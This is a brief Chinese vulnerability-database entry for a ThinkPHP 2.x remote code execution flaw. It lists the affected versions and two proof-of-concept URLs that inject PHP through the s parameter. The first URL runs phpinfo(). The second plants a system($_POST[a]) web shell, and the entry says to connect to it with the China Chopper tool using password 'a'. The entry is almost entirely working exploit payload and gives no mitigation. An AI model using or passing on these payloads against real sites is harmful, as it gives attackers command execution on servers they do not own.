---
title: 'Thinkphp-2.X-RCE漏洞'
date: Wed, 26 Aug 2020 03:54:30 +0000
draft: false
tags: ['白阁-漏洞库']
---

### 漏洞范围

Thinkphp 2.X

### 漏洞POC

```
/index.php?s=/index/index/xxx/${@phpinfo()}
```

![](Thinkphp-2.X-RCE漏洞.assets/1627364296438965.jpg)

```
/index.php?s=/index/index/xxx/${@print(system($_POST[a]))}
```

菜刀连接,密码为a。